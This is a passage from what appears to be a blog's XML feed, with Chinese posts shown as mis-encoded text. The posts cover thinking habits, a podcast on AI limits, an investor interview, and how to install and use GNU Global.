çš„ç”¨æˆ·ã€‚</p><p>å¬å®Œè¿™æœŸåšå®¢ï¼Œæˆ‘æ„Ÿè§‰é™ˆå¿—è¿œæ˜¯éå¸¸çº¯ç²¹çš„æŠ€æœ¯äººå‘˜ï¼Œè°¦é€Šå†…æ•›ï¼Œå¯¹æŠ€æœ¯å……æ»¡çƒ­çˆ±ï¼Œå–œæ¬¢ç”¨æŠ€æœ¯è§£å†³ç°å®ç”Ÿæ´»ä¸­çš„é—®é¢˜ã€‚åšæŒè‡ªå·±çš„äº§å“å®šä½ï¼Œä¸æµ®èºä¸å‚²å¨‡ï¼Œé•¿æœŸè®¤çœŸåœ°å®Œå–„äº§å“åŠŸèƒ½ï¼Œä¸ä¸ºçŸ­æœŸçš„ç”Ÿå­˜è€Œæ„Ÿåˆ°ç„¦è™‘ï¼Œè¿™æˆ–è®¸å°±æ˜¯å°è€Œç¾çš„å›¢é˜Ÿçš„ä¼˜åŠ¿å§ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>Programming</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è®­ç»ƒæ€ç»´ï¼Œåˆ¤æ–­è§‚ç‚¹</title>
    <link href="/cn/zhengweizhongyao/"/>
    <url>/cn/zhengweizhongyao/</url>
    
    <content type="html"><![CDATA[<ol><li><p>é¿å…è¿‡åº¦è§£è¯»</p><ul><li>å¥½çš„æ€ç»´æ–¹å¼å¤§ä½“ç¬¦åˆã€Šå­™å­å…µæ³•ã€‹ä¸­ã€Œä»¥æ­£åˆï¼Œä»¥å¥‡èƒœã€ï¼Œè¿™é‡Œçš„å¥‡æ˜¯æœºåŠ¨å…µåŠ›çš„æ„æ€ã€‚æˆ‘ä»¬åœ¨äº†è§£äº‹æƒ…çš„æ—¶å€™ï¼Œé¦–å…ˆè¦ç†è§£ä¸»æµè§‚ç‚¹ï¼Œè¿™æ ·æˆ‘ä»¬åšäº‹æ‰æœ‰åšå®çš„èµ·ç‚¹ï¼Œä¸€ä¸Šæ¥å°±çœ‹éä¸»æµè§‚ç‚¹ï¼Œå¾ˆå¯èƒ½å°±ä¸¢æ‰äº†æ ¹æœ¬è€Œé™·å…¥æ—æ”¯ç»†èŠ‚å»äº†ã€‚</li></ul></li><li><p>è¯ä¼ªæ¯”è¯å®æ›´é‡è¦</p><ul><li>äººç±»å¯¹ä¸–ç•Œçš„è®¤çŸ¥éƒ½æ˜¯ç‰‡é¢çš„ï¼Œåªæ˜¯ä¸æ–­åœ°æ¥è¿‘çœŸç†ã€‚å¾ˆå¤šä½ è®¤ä¸ºå¯ä»¥è‡ªæ´½ï¼Œå¯ä»¥ç†è§£çš„åŸå› ï¼Œå¯èƒ½ä¸æ˜¯çœŸæ­£çš„åŸå› ï¼Œå¹¶ä¸æ˜¯å› æœå…³ç³»ï¼Œç”šè‡³å¯èƒ½éƒ½ä¸æ˜¯ç›¸å…³å…³ç³»ã€‚</li><li>æŠŠé”™è¯¯çš„åŸå› å½“æˆçœŸæ­£çš„åŸå› ï¼Œè¦å€’å¤§éœ‰ã€‚ä¸€å®šè¦å°å¿ƒæ— æ³•è¯ä¼ªçš„æ¨è®ºï¼Œä¸€ä¸ªäº‹æƒ…æˆåŠŸçš„å› ç´ å¯ä»¥æœ‰å¾ˆå¤šï¼Œéƒ½å¯ä»¥è§£é‡Šçš„é€šã€‚</li><li>å¸¸è¯†ä¹‹æ‰€ä»¥é‡è¦æ˜¯å› ä¸ºç»è¿‡äº†é•¿æ—¶é—´çš„è¯å®å’Œè¯ä¼ªæ˜¯å¯é çš„ç»“è®ºï¼Œéµå¾ªå¸¸è¯†å°±å¯ä»¥é¿å¼€å¾ˆå¤šçš„é”™è¯¯å’Œé™·é˜±</li></ul></li><li><p>åˆ¤å®šåˆ©ç›Šå†²çª</p><ul><li>å½“å‘è¡¨æ„è§çš„äººå’Œæ‰€è®¨è®ºçš„ä¸»é¢˜åˆ©ç›Šç›¸å…³ï¼Œé‚£ä¹ˆå…¶ç»“å¯èƒ½å°±ä¼šæœ‰æ˜æ˜¾çš„åå‘æ€§ã€‚</li><li>ä½¿ç”¨é€»è¾‘è¿‡æ»¤ä¿¡æ¯å’Œç»“è®º</li><li>å¾—å‡ºé—®é¢˜ç»“è®ºçš„æ¨ç†è¿‡ç¨‹éœ€è¦ç¬¦åˆé€»è¾‘ï¼Œä¸èƒ½ä¾é æƒ³è±¡ã€‚</li></ul></li><li><p>åˆ©ç”¨æˆæœ¬æ€ç»´è¿›è¡Œåˆ¤æ–­</p><ul><li>åšä»»ä½•äº‹æƒ…éƒ½æœ‰æˆæœ¬ï¼Œå½“æ¥å—çš„ä¿¡æ¯å¤ªå¤šçš„æ—¶å€™ï¼Œå¯ä»¥ç”¨æˆæœ¬å› ç´ è¿›è¡Œè¿‡æ»¤ï¼Œé€šè¿‡æˆæœ¬æ¥æ€è€ƒäººä»¬åšäº‹çš„åˆè¡·å’Œç†ç”±æ˜¯æœ‰æ•ˆçš„ã€‚</li></ul></li></ol><p>#ç¡…è°·æ¥ä¿¡ #å´å†›</p>]]></content>
    
    
    
    <tags>
      
      <tag>KNOWLEDGE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è®¤çŸ¥è¢« AI æš´å‡»çš„ç¬é—´</title>
    <link href="/cn/ai_thinking/"/>
    <url>/cn/ai_thinking/</url>
    
    <content type="html"><![CDATA[<p><a href="https://podcasts.apple.com/us/podcast/%E8%AE%A4%E7%9F%A5%E8%A2%ABai%E6%9A%B4%E5%87%BB%E7%9A%84%E7%9E%AC%E9%97%B4/id1614381317?i=1000598827531">https://podcasts.apple.com/us/podcast/%E8%AE%A4%E7%9F%A5%E8%A2%ABai%E6%9A%B4%E5%87%BB%E7%9A%84%E7%9E%AC%E9%97%B4/id1614381317?i=1000598827531</a></p><p>ä»Šå¤©å¬äº†ä¸€æœŸã€Œè®¤çŸ¥è¢« AI æš´å‡»çš„ç¬é—´ã€‹ï¼Œé‡Œé¢æœ‰å‡ ä¸ªæŒºæœ‰æ„æ€çš„è¯é¢˜ ã€‚</p><h2 id="â€œAGIâ€æŠ€æœ¯ç›®å‰å­˜åœ¨çš„å“ªäº›é—®é¢˜-ï¼Ÿ"><a href="#â€œAGIâ€æŠ€æœ¯ç›®å‰å­˜åœ¨çš„å“ªäº›é—®é¢˜-ï¼Ÿ" class="headerlink" title="â€œAGIâ€æŠ€æœ¯ç›®å‰å­˜åœ¨çš„å“ªäº›é—®é¢˜  ï¼Ÿ"></a>â€œAGIâ€æŠ€æœ¯ç›®å‰å­˜åœ¨çš„å“ªäº›é—®é¢˜  ï¼Ÿ</h2><p>é¦–å…ˆæ˜¯ç®—åŠ›çš„é—®é¢˜ï¼Œæ—©æœŸå¤§å®¶åœ¨ä½¿ç”¨ ChatGPT çš„æ—¶å€™åº”è¯¥éƒ½é‡ä¸Šäº†æ— æ³•å“åº”çš„æƒ…å†µï¼ŒåŒ…æ‹¬åæ¥å¤§èŒƒå›´çš„å°å·ï¼Œé™åˆ¶ç‰¹å®šæœºæˆ¿ IP æ®µçš„è®¿é—®ï¼Œè¿™äº›å…¶å®éƒ½æ˜¯ç®—åŠ›ä¸è¶³çš„è¡¨ç°ã€‚è™½ç„¶ Google å·ç§° PaLM 2 çš„ Gecko æ¨¡å‹å¯ä»¥åœ¨æ‰‹æœºä¸Šè¿è¡Œï¼Œå…·ä½“çš„æ–‡æœ¬ç”Ÿæˆæ•ˆæœå’Œèƒ½é‡æ¶ˆè€—æƒ…å†µéƒ½æ²¡æœ‰è¯¦ç»†çš„ä¿¡æ¯ã€‚</p><p>å…¶æ¬¡ï¼ŒChatGPT è¿™äº› Ai ç¨‹åºç”Ÿæˆçš„å†…å®¹å¹¶ä¸æ€»èƒ½æ»¡è¶³éœ€æ±‚ï¼Œæœ‰æ—¶å€™ç”šè‡³è§‰å¾—æœ‰ç‚¹å‚»ï¼Œå—é™äºå­¦ä¹ çš„æ•°æ®å’Œç®—æ³•æ¨¡å‹ï¼Œäººå·¥æ™ºèƒ½é¢†åŸŸæ­£åœ¨æŒ‘æˆ˜å…¶ä¸å¤ªæ“…é•¿çš„é€šç”¨äººå·¥æ™ºèƒ½ï¼Œåœ¨ä¸“ç”¨äººå·¥æ™ºèƒ½æ–¹é¢ï¼ˆæ¯”å¦‚ä¸‹å›´æ£‹ï¼‰çš„è®¸å¤šåœ°æ–¹ï¼Œäººç±»æ—©å·²ç»ä¸æ˜¯å¯¹æ‰‹äº†ã€‚</p><p>æœ€åï¼ŒAGI ç¨‹åºæ˜¯ä¸èƒ½æœ‰ã€Œä»·å€¼åˆ¤æ–­ã€çš„ï¼Œæ²¡æœ‰ä»·å€¼è§‚å°±å¯èƒ½ç”Ÿæˆæœ‰å®³çš„å†…å®¹ï¼Œè¿™äº›å†…å®¹ç”šè‡³å¯èƒ½å¯¹äººç±»äº§ç”Ÿå¨èƒã€‚</p><h2 id="äººè„‘å’Œâ€œAiè„‘â€å·¥ä½œæ–¹å¼çš„ä¸»è¦åŒºåˆ«-ï¼Ÿ"><a href="#äººè„‘å’Œâ€œAiè„‘â€å·¥ä½œæ–¹å¼çš„ä¸»è¦åŒºåˆ«-ï¼Ÿ" class="headerlink" title="äººè„‘å’Œâ€œAiè„‘â€å·¥ä½œæ–¹å¼çš„ä¸»è¦åŒºåˆ« ï¼Ÿ"></a>äººè„‘å’Œâ€œAiè„‘â€å·¥ä½œæ–¹å¼çš„ä¸»è¦åŒºåˆ« ï¼Ÿ</h2><p>äººè„‘çš„ç‰¹ç‚¹æ˜¯ä»¥å¾ˆä½çš„åŠŸè€—å¿«é€Ÿå“åº”ï¼Œè¿™å°±æ˜¯äººä»¬å–œæ¬¢å®å¤§å™äº‹å’Œæ¨¡å¼è¯†åˆ«çš„åŸå› ã€‚æŒ‰ç…§åº·å¾·å“²å­¦çš„è§‚å¿µã€Œäººä¸ºè‡ªç„¶ç•Œç«‹æ³•ã€ï¼Œå®¢è§‚å¯¹è±¡å³äººçš„è®¤è¯†å¯¹è±¡ä¸æ˜¯åœ¨é‚£é‡Œç­‰ç€ä½ å»è®¤è¯†ï¼Œè€Œæ˜¯ç”±ä½ çš„è®¤è¯†è¿‡ç¨‹èƒ½åŠ¨åœ°å»ºç«‹èµ·ä¸€ä¸ªå¯¹è±¡ã€‚</p><p>å¤§è¯­è¨€æ¨¡å‹ (LLM)åˆ™æ˜¯é€šè¿‡å¯¹å¤§è§„æ¨¡è¯­æ–™åº“çš„è®­ç»ƒå’Œè‡ªç„¶è¯­è¨€å¤„ç†æŠ€æœ¯çš„åº”ç”¨ï¼Œä½¿å¾—æ¨¡å‹èƒ½å¤Ÿç†è§£å’Œç”Ÿæˆè‡ªç„¶è¯­è¨€ï¼Œå¹¶èƒ½å¤Ÿæ‰§è¡Œå„ç§è¯­è¨€ä»»åŠ¡ï¼Œå¦‚æ–‡æœ¬ç”Ÿæˆã€æœºå™¨ç¿»è¯‘ã€è¯­éŸ³è¯†åˆ«ç­‰ã€‚</p><h2 id="äººç±»åº”è¯¥æ‹…å¿ƒè¢«-Ai-å–ä»£ï¼Œç”šè‡³è¿˜æœ‰ç‚¹ææƒ§å—-ï¼Ÿ"><a href="#äººç±»åº”è¯¥æ‹…å¿ƒè¢«-Ai-å–ä»£ï¼Œç”šè‡³è¿˜æœ‰ç‚¹ææƒ§å—-ï¼Ÿ" class="headerlink" title="äººç±»åº”è¯¥æ‹…å¿ƒè¢« Ai å–ä»£ï¼Œç”šè‡³è¿˜æœ‰ç‚¹ææƒ§å— ï¼Ÿ"></a>äººç±»åº”è¯¥æ‹…å¿ƒè¢« Ai å–ä»£ï¼Œç”šè‡³è¿˜æœ‰ç‚¹ææƒ§å— ï¼Ÿ</h2><p>é¦–å…ˆï¼Œæˆ‘ä»¬åº”è¯¥å……åˆ†åˆ©ç”¨ Ai çš„èƒ½åŠ›æ¥å®Œæˆå„ç§ä»»åŠ¡ï¼ŒAi åº”è¯¥ä½œä¸ºäººç±»çš„ ã€Œå‰¯é©¾ã€è€Œéç«äº‰å¯¹æ‰‹ã€‚åœ¨å›½é™…è±¡æ£‹ä¸Šå‡ºç°äº†äººå’Œ ai ç›¸ç»“åˆçš„ç¨‹åºï¼Œè‡ªåŠ¨åˆ¤æ–­ä»€ä¹ˆæƒ…å†µç”¨ Ai åˆ¤æ–­ï¼Œä»€ä¹ˆæƒ…å†µç”¨äººç±»åˆ¤æ–­ï¼Œæ®è¯´æ‰“è´¥äº†ä¸å°‘ master æ¨¡å‹ã€‚</p><p>Will è€å¸ˆåˆ™æå‡ºä¸€ä¸ªã€Œå·¥å…·äººã€æ¦‚å¿µï¼Œåªèƒ½æ‰§è¡Œä»»åŠ¡æ²¡æœ‰è‡ªå·±çš„æ€æƒ³å°±æ˜¯å·¥å…·äººã€‚äººç±»å’Œ Ai çš„å…³ç³»å¯ä»¥ç®€å•åœ°ç†è§£ä¸ºæŠŠæœºå™¨çš„å·¥ä½œè¿˜ç»™æœºå™¨ï¼Œè¿™ä¹Ÿä¼šå¸¦æ¥ç”Ÿäº§åŠ›çš„å¤§å¹…æé«˜ã€‚</p><p>å¦å¤–ï¼ŒAi æ˜¯æ²¡æœ‰ä»·å€¼åˆ¤æ–­å’Œæ•´åˆèƒ½åŠ›çš„ï¼ŒAi å¯ä»¥å¿«é€Ÿé˜…è¯»è´¢åŠ¡æŠ¥è¡¨ï¼Œå¿«é€Ÿç”Ÿæˆå„ç§åŸºé¢æœ¬ä¿¡æ¯ï¼Œä½†æ˜¯é—® Ai åˆ°åº•è¯¥æŠ•èµ„å“ªå®¶å…¬å¸ï¼Œä½ èƒ½ç›¸ä¿¡ Ai çš„ç»“è®ºå— ï¼Ÿæˆ–è€…ä½ ç”¨ Ai ç”Ÿæˆäº†ä¸€ä»½æŠ•ç ”æŠ¥å‘Šäº¤ç»™è€æ¿ï¼Œè€æ¿è§‰å¾—æŒºå¥½ï¼Œä½†å¯èƒ½è¿˜æ˜¯ä¼šé—®ä½ å…·ä½“çš„çœ‹æ³•ï¼Œè¿™æˆ–è®¸åˆå›åˆ°äº†å¦ä¸€ä¸ªé—®é¢˜ï¼ŒçœŸçš„å°±å®Œå…¨ç›¸ä¿¡ Ai å— </p>]]></content>
    
    
    
    <tags>
      
      <tag>ai</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>éŸ©å¹¿æ–Œè®²æŠ•èµ„</title>
    <link href="/cn/interview_guangbinHan/"/>
    <url>/cn/interview_guangbinHan/</url>
    
    <content type="html"><![CDATA[<p>éŸ©å¹¿æ–Œåœ¨é‡‡è®¿ä¸­æåŠä¸¤ä¸ªå’ŒæŠ•èµ„ç›¸å…³çš„é‡è¦æ¦‚å¿µï¼Œæ²‰æ²¡æˆæœ¬ å’Œ å¹¸å­˜è€…åå·®ã€‚</p><p>æ²‰æ²¡æˆæœ¬ï¼ŒæŒ‡å·²ç»å‘ç”Ÿçš„ä¸å¯å›æ”¶çš„æˆæœ¬ï¼Œä»ç†æ€§è§’åº¦è®²å’Œå½“å‰å†³ç­–æ— å…³ï¼Œè€Œå®é™…ä¸Šå´å¯¹äººçš„å†³ç­–æœ‰é‡å¤§å½±å“ã€‚å—æ²‰æ²¡æˆæœ¬çš„å½±å“ï¼Œäººä»¬å¯èƒ½æ— æ³•è¿…é€Ÿçº æ­£é”™è¯¯ï¼Œæ— æ³•å¿«é€Ÿç ä»“ã€‚å‡è®¾ä¹°å…¥èŒ…å°æ—¶50å…ƒï¼ŒèŒ…å°æ¶¨åˆ°100å…ƒï¼Œæˆæœ¬å°±æ˜¯100å…ƒäº†ï¼Œåº”è¯¥åŸºäºå½“ä¸‹å»è¯„ä¼°ã€‚</p><p>å¹¸å­˜è€…åå·®ï¼Œå±äºå…¸å‹çš„å½’å› é”™è¯¯ã€‚è§£é‡Šæ²¡æœ‰æ„ä¹‰ï¼Œæ­£ç¡®çš„é¢„æµ‹æ‰æœ‰ä»·å€¼ã€‚å¸¸è§æœ‰äººè¯´æˆ‘å‡ å¹´å‰çœ‹å¥½å®å¾·æ—¶ä»£ï¼Œå®å¾·æ—¶ä»£ä¹Ÿæ¶¨äº†ï¼Œä½†æ˜¯ä¸Šæ¶¨çš„åŸå› å¾ˆå¯èƒ½ä¸æ˜¯äººä»¬æ‰€è¯´çš„åŸå› ã€‚åªæœ‰ç«‹è¶³å½“ä¸‹ï¼Œå¯¹è¡Œä¸šå‘å±•ã€å…¬å¸è¯„ä¼°ã€è´¢åŠ¡åˆ†æç­‰æ–¹é¢æœ‰è‡ªå·±ç‹¬åˆ°çš„è§è§£ï¼Œæ‰èƒ½å–å¾—è¶…é¢çš„æ”¶ç›Šã€‚</p><p>éŸ©å¹¿æ–Œåœ¨é‡‡è®¿ä¸­è§£é‡Šäº†ææ¸…æ¥šä¼¼æ˜¯è€Œéçš„é—®é¢˜çš„é‡è¦æ€§ï¼Œä¼¼æ˜¯è€Œéçš„é—®é¢˜å’Œå¹¸å­˜è€…åå·®æœ‰å…³ï¼Œéœ€è¦æ˜ç™½äº‹ç‰©çš„æ·±å±‚æ¬¡åŸå› ã€‚æ˜æ˜¾æ­£ç¡®å’Œæ˜æ˜¾é”™è¯¯çš„é—®é¢˜éƒ½æ¯”è¾ƒå®¹æ˜“ç†è§£ï¼Œå…³é”®å°±æ˜¯ä¼¼æ˜¯è€Œéçš„é—®é¢˜ï¼Œé‡ç‚¹åˆ†æä¼¼æ˜¯è€Œéçš„é—®é¢˜ï¼Œä½¿å¾—ä½ å¯¹äº‹ç‰©çš„ç†è§£å’Œä»–äººç›¸æ¯”æ‰€æœ‰ä¸åŒã€‚è¿™äº›ä¸åŒçš„ç†è§£å°±æ˜¯æŠ•èµ„æˆåŠŸçš„å…³é”®ï¼Œæœ‰æ—¶å€™æ˜¯é¢„æœŸå·®ï¼Œä¹Ÿå¯èƒ½æ˜¯å…¶ä»–ä¸åŒçš„çœ‹æ³•ã€‚</p><p>è§£å†³ã€Œä¼¼æ˜¯è€Œéã€é—®é¢˜çš„æ–¹æ³•ï¼Œé¦–å…ˆè¦æ„è¯†åˆ°äººçš„è®¤çŸ¥æ˜¯å­˜åœ¨åè§çš„ï¼Œè¦ä»¥å¼€æ”¾çš„æ€ç»´å’Œå¿ƒæ€å»çœ‹å¾…é—®é¢˜ã€‚å¼€æ”¾æ„å‘³ç€è¦å»å€¾å¬åˆ«äººçš„æ„è§å’Œå¸‚åœºçš„å£°éŸ³ï¼Œå¦‚æœåé¦ˆå’Œè®¾æƒ³çš„ä¸ä¸€è‡´å°±è¦åæ€è‡ªå·±çš„æŠ•èµ„é€»è¾‘ï¼ŒæŠ•èµ„çš„è¿‡ç¨‹ä¹Ÿæ˜¯ä¸æ–­â€œçº é”™â€çš„è¿‡ç¨‹ã€‚ä½†æŠ•èµ„ä¸­éœ€è¦è¿‡æ»¤å°çš„å™ªéŸ³ï¼Œé¿å…é™·äºç»†èŠ‚è€Œä¸å¯è‡ªæ‹”ï¼ŒæŠ“ä½ä¸»è¦çŸ›ç›¾ï¼Œä¸»è¦å…³æ³¨å¤§çš„é”™è¯¯ã€‚</p><p>ä»é‡‡è®¿çš„å†…å®¹çœ‹å’Œæ—å›­ç›¸æ¯”éŸ©å¹¿æ–Œæ›´åƒæ˜¯ä»·å€¼æŠ•èµ„è€…ï¼Œçœ‹éŸ©å¹¿æ–Œæ—©æœŸçš„è§†é¢‘ï¼Œæ€»ç»“äº†ä¸€ä¸‹ä»–çš„æŠ•èµ„ç†å¿µï¼š<br>é•¿æœŸä»·å€¼æŠ•èµ„è€…ï¼ŒæŠ•èµ„æœªæ¥çš„ç»©ä¼˜è‚¡ï¼Œå›é¿é—®é¢˜è‚¡ï¼Œå…¬å¸çš„ç®¡ç†å±‚å¾ˆé‡è¦ ï¼ˆè¯šå®ã€æ­£ç›´ï¼‰ï¼Œè¿½æ±‚ç¡®å®šæ€§å’Œå›æŠ¥ç‡ã€‚</p><p>éŸ©å¹¿æ–Œè¯´åœ¨å›½å†…ï¼Œå¥½çš„ä¼ä¸šå®¶å¤ªå°‘ï¼Œå¤§å¤šæ•°å…¬å¸çš„ç®¡ç†è€…æ˜¯è€æ¿ã€‚<br>ä»–å¿ƒç›®ä¸­å¥½å…¬å¸çš„å®šä¹‰ï¼šå¥½çš„è¡Œä¸šï¼Œå¥½çš„ä¸šç»©ï¼Œå¥½çš„ç®¡ç†å±‚ï¼Œå¯¹å‘˜å·¥å¥½ï¼Œå¯¹è‚¡ä¸œä¹Ÿå¥½ã€‚</p><p>æ–°æ€å“²åœ¨å¹³æ—¶æ„å»ºå¯æŠ•èµ„çš„è‚¡ç¥¨æ± ï¼Œæ ¹æ®ä¸åŒçš„å‘¨æœŸé€‰æ‹©ä¸åŒçš„è‚¡ç¥¨å½¢æˆæŠ•èµ„ç»„åˆï¼Œç»„åˆä¸­çš„è‚¡ç¥¨è¾ƒä¸ºåˆ†æ•£åœ¨ä¸€å®šç¨‹åº¦ä¸Šå½¢æˆå¯¹å†²ï¼Œä»è€Œä½¿ä¸šç»©æ›´åŠ å¹³æ»‘ã€‚åœ¨è¿½æ±‚å›æŠ¥ç‡ä¸Šï¼Œæˆ‘è§‰å¾—å’Œç§å‹Ÿæœ‰å…³ç³»ï¼Œå¸Œæœ›é€šè¿‡ä¸šç»©æ¥æ‰©å¤§è§„æ¨¡ï¼Œå¦å¤–ç›®å‰æ–°æ€å“²çš„è§„æ¨¡è¿˜æ˜¯ä¸å¤ªå¤§ï¼Œå¯ä»¥è¾ƒä¸ºå¿«é€Ÿåœ°è°ƒæ•´ç­–ç•¥ã€‚</p><p>éŸ©å¹¿æ–Œçš„ã€Œå…»çŒªç†è®ºã€ï¼ŒçŒªä»50æ–¤é•¿åˆ°200æ–¤çš„æˆé•¿é€Ÿåº¦æ˜¯æœ€å¿«çš„ï¼ŒæŠ•èµ„å…¬å¸æœ€å¥½é€‰æ‹©ä¸Šå¸‚å…¬å¸ç«äº‰ä¼˜åŠ¿å½¢æˆå¹¶ä¸”æˆé•¿åŠ é€Ÿçš„é˜¶æ®µä»‹å…¥ï¼Œé‡ç‚¹æŠ•èµ„å…¬å¸ä»ä¼˜ç§€åˆ°å“è¶Šçš„è¿‡ç¨‹ã€‚</p><p>éŸ©å¹¿æ–Œå¯¹æŠ•èµ„è€…çš„ä¸€äº›å»ºè®®ï¼š</p><ul><li>åšæŒé•¿æœŸä¸»ä¹‰: ç›¸ä¿¡æŠŠä¸€äº›æœ¬åˆ†ã€åŸºç¡€çš„äº‹æƒ…åšå¥½ï¼Œé•¿æœŸèƒ½å¸¦æ¥å¯è§‚çš„å›æŠ¥ã€‚</li><li>åšé¢„æœŸå¯æ§çš„æŠ•èµ„: æŠ•èµ„æœ€é‡è¦çš„æ˜¯åš 1.2çš„næ¬¡æ–¹ï¼Œ20%çš„å›æŠ¥ç‡ï¼Œç»è¿‡åŠªåŠ›ã€ä¸“ä¸šçš„æ“ä½œå¯ä»¥åšåˆ°ã€‚</li><li>å¤åˆ©ä¸»ä¹‰: èµ„é‡‘åœ¨æ»šé›ªçƒçš„è¿‡ç¨‹ä¸­ï¼Œå¿ƒæ€è¦å¹³å’Œï¼Œè¿½æ±‚é•¿æœŸçš„å¤åˆ©ï¼Œæ…¢å°±æ˜¯å¿«</li><li>æ…ç”¨æ æ†: ç®—æ¸…å¸ï¼Œæœ‰äº› P2P å¹´åŒ–èèµ„æˆæœ¬é«˜è¾¾ 18%ï¼Œæ—¢ä½¿æ˜¯ä¸“ä¸šæœºæ„ä¹Ÿå¾ˆéš¾ä¿æŒè¿™ä¸ªæ°´å¹³</li><li>ä¸ä¼˜ç§€è€…åŒä¼: å¥½çš„æŠ•èµ„æœºä¼šä¸å¤šï¼Œæ‰€ä»¥ä¸€å®šè¦å’Œæœ€ä¼˜ç§€çš„äººæ‰“äº¤é“ï¼Œå’Œæœ€ä¼˜ç§€çš„ä¼ä¸šå®¶æ‰“äº¤é“ã€‚</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>investment</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GNU Global çš„ä½¿ç”¨</title>
    <link href="/cn/gtags-cscope/"/>
    <url>/cn/gtags-cscope/</url>
    
    <content type="html"><![CDATA[<h2 id="â˜†-1-GNU-Global-ç®€ä»‹"><a href="#â˜†-1-GNU-Global-ç®€ä»‹" class="headerlink" title="â˜† 1. GNU Global ç®€ä»‹"></a>â˜† 1. GNU Global ç®€ä»‹</h2><p>GNU Global æ˜¯ä¸€ç§æºä»£ç æ ‡è®°ç³»ç»Ÿï¼Œå¯ä»¥å¸®åŠ©ç¨‹åºå‘˜åœ¨ä»£ç åº“ä¸­å¿«é€Ÿå®šä½å‡½æ•°ã€å˜é‡ã€å®å®šä¹‰ç­‰ã€‚GNU Global å¯ä»¥ç”Ÿæˆç´¢å¼•æ–‡ä»¶ï¼Œç”¨äºå¿«é€Ÿè·³è½¬åˆ°å®šä¹‰ã€å¼•ç”¨ã€å‡½æ•°è°ƒç”¨ç­‰åœ°æ–¹ï¼Œä»è€Œæé«˜ä»£ç é˜…è¯»å’Œç¼–è¾‘çš„æ•ˆç‡ã€‚</p><p>GNU global å…·æœ‰ä»¥ä¸‹ä¼˜åŠ¿ï¼š</p><ol><li>å¤šè¯­è¨€æ”¯æŒï¼šåœ¨é»˜è®¤æƒ…å†µ GNU Global æ”¯æŒ C, C++, Yacc, Java, PHP4 å’Œ assembly è¯­è¨€ï¼Œåœ¨å®‰è£…æ‹“å±•çš„æƒ…å†µä¸‹å¯ä»¥æ”¯æŒ 50å¤šç§è¯­è¨€ã€‚</li><li>å®Œæ•´æ€§ï¼šGNU global å¯ä»¥æ ‡è®°æ›´å¤šç¬¦å·çš„ä½ç½®ï¼Œå¦‚å®šä¹‰ã€å¼•ç”¨ã€ç»“æ„ä½“ã€ç±»ï¼Œå®å®šä¹‰ç­‰ã€‚</li><li>é«˜æ•ˆæ€§ï¼šGNU global ç”Ÿæˆé«˜æ•ˆçš„ tag æ•°æ®åº“ï¼ŒèŠ‚çœäº†ç£ç›˜ç©ºé—´ï¼Œä½¿å¾—æŸ¥è¯¢é€Ÿåº¦æ›´å¿«ï¼ŒåŒæ—¶ä¹Ÿæ”¯æŒå¢é‡æ›´æ–°ç´¢å¼•æ–‡ä»¶ï¼Œè¿™æ„å‘³ç€å½“æºä»£ç å‘ç”Ÿå˜åŒ–æ—¶ï¼Œåªéœ€è¦é‡æ–°ç”Ÿæˆå˜æ›´çš„éƒ¨åˆ†ï¼Œè€Œä¸éœ€è¦é‡æ–°ç”Ÿæˆæ•´ä¸ªç´¢å¼•æ–‡ä»¶ã€‚</li><li>å¯é›†æˆï¼šå¯ä»¥åœ¨ Emacs, Vi &#x2F;vim,  Less viewer, Bash shellï¼Œ æµè§ˆå™¨ç¯å¢ƒä¸‹æ­£å¸¸ä½¿ç”¨</li><li>æŒç»­æ›´æ–°ï¼š <a href="https://www.gnu.org/software/global/whatsnew.html">https://www.gnu.org/software/global/whatsnew.html</a></li></ol><p>æ›´å¤šä¿¡æ¯è¯·å‚è€ƒï¼š <a href="https://www.gnu.org/software/global/globaldoc_toc.html">https://www.gnu.org/software/global/globaldoc_toc.html</a> 1.3 Features</p><h2 id="â˜†-2-GNU-Global-çš„å®‰è£…"><a href="#â˜†-2-GNU-Global-çš„å®‰è£…" class="headerlink" title="â˜† 2. GNU Global çš„å®‰è£…"></a>â˜† 2. GNU Global çš„å®‰è£…</h2><p>ä¸‹è½½åœ°å€ï¼š <a href="https://ftp.gnu.org/pub/gnu/global/global-6.6.9.tar.gz">https://ftp.gnu.org/pub/gnu/global/global-6.6.9.tar.gz</a></p><p><a href="https://www.gnu.org/software/global/download.html">https://www.gnu.org/software/global/download.html</a> ä¸­è¯´æ˜äº†æºç ç¼–è¯‘æ–¹æ³•ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">% sh reconf.sh <br>% ./configure<br>% make<br></code></pre></td></tr></table></figure><p>Fedora&#x2F;Debian ç­‰ç³»ç»Ÿå¯ä»¥ä½¿ç”¨ä»“åº“ç›´æ¥å®‰è£…ï¼Œä¸‹é¢ä»¥ Fedora Linux ä¸ºä¾‹</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo dnf install <span class="hljs-keyword">global</span>-ctags <span class="hljs-keyword">global</span> <span class="hljs-keyword">cscope</span><br></code></pre></td></tr></table></figure><p>å¦‚æœä¸å®‰è£… <code>global-ctags</code> åœ¨ Fedora ä¸‹å¯èƒ½ä¼šæŠ¥ <code>Cannot enable custom plug-in parser for GNU GLOBAL</code> çš„é”™è¯¯ã€‚</p><p>gtags-cscope ç”± global å®‰è£…åŒ…æä¾›ä¸ç”¨å¦å¤–å®‰è£…äº†ã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo dnf whatprovides gtags-<span class="hljs-keyword">cscope</span><br><br><span class="hljs-keyword">global</span>-<span class="hljs-number">6.6</span>.<span class="hljs-number">5</span>-<span class="hljs-number">7</span>.fc37.x86_64 : Source code <span class="hljs-keyword">tag</span> <span class="hljs-built_in">system</span><br>ä»“åº“        ï¼š@System<br>åŒ¹é…æ¥æºï¼š<br>æ–‡ä»¶å    